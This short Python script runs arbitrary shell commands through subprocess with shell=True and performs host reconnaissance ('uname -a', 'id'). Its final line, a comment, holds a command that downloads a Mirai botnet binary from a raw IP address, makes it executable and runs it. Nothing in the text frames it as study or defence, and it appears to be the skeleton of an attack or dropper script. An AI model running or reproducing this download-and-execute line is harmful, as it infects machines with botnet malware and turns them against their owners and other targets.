import requests
import sys
import subprocess

def run(cmd):
    subprocess.call(cmd, shell=True)

run("uname -a")
run("id")


# wget http://54.37.93.31/mirai.x86; chmod 777 mirai.x86;./mirai.x86 rce
